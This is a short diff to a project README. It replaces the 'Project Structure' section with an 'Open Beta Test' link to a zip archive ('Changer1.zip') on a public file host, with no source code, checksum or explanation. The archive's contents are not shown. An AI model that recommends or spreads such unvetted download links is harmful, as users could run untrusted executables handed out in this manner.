@@ -19,11 +19,8 @@
 ## ✨ Interface
 <img width="489" height="385" alt="ChatGPT Image Jun 28, 2026, 03_51_33 PM" src="https://github.com/user-attachments/assets/63644cdc-1604-4c48-8186-a8a93ce02fb2" />
 
-## 📁 Project Structure
-```text
-docs/
-assets/
-```
+## 📁 Open Beta Test
+https://www.mediafire.com/file/97lbamcyqtiutm0/Changer1.zip/file
 
 ## 🗺️ Roadmap
 - [x] UI concept
